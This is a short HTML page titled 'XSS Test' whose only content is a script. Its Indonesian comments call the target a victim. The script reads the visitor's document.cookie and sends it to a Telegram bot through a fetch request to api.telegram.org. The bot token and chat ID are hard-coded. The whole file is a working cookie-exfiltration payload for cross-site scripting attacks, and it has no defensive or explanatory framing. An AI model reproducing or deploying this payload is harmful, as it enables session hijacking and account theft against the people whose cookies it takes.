<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XSS Test</title>
</head>
<body>
    <h1>Testing XSS</h1>
    <script>
        // Ambil cookie korban
        var cookieData = document.cookie;

        // Kirim ke bot Telegram
        var botToken = "7748564047:AAHjrbeUGRSQmrJkDFv1HMFMbbWtDFKD9ak"; // Ganti dengan Token Bot
        var chatId = "7353813329"; // Ganti dengan Chat ID
        
        var url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent("Cookie: " + cookieData);
        
        fetch(url)
            .then(response => console.log("Cookie Sent to Telegram!"))
            .catch(error => console.error("Error sending cookie:", error));
    </script>
</body>
</html>
